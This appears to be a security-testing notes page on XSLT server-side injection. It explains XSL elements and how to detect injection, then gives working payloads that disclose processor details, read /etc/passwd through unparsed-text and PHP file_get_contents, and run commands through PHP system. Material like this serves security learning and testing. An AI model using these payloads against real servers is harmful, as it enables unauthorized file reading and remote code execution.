---
layout: default
title: XSLT
permalink: /Web/xslt/
---

# XSLT Server-Side Injection
XSLT (Extensible Stylesheet Language Transformations) server-side injection is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server.
XSLT is a language used to transform XML documents into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically.

XSLT can be used to define a data format which is subsequently enriched with data from the XML document. XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the xsl-prefix. The following are some commonly used XSL elements:
- `<xsl:template>`: This element indicates an XSL template. It can contain a match attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the select attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the select attribute
- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the select argument. Additionally, a sort order may be specified in the order argument
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the test argument.

## Identifying XSLT Injection
Suppose a web application stores user input in an XML document and displays the data using XSLT processing. In that case, it might suffer from XSLT injection if the input is inserted without sanitization before XSLT processing. To confirm that, we can try to inject a broken XML tag to try to provoke an error in the web application. We can achieve this by providing the username `<`.
It doesn't confirm that XSLT injection present, but an indication.

## Information Disclosure
We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements:
```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## Local File Inclusion (LFI)
We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function unparsed-text that can be used to read a local file:
```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
It was only introduced in XSLT version 2.0. thus might not work.
However, if the XSLT library is configured to support PHP functions, we can call the PHP function file_get_contents using the following XSLT element:
```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
## Remote Code Execution (RCE)
If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function system to execute a command:
```
<xsl:value-of select="php:function('system','id')" />
```




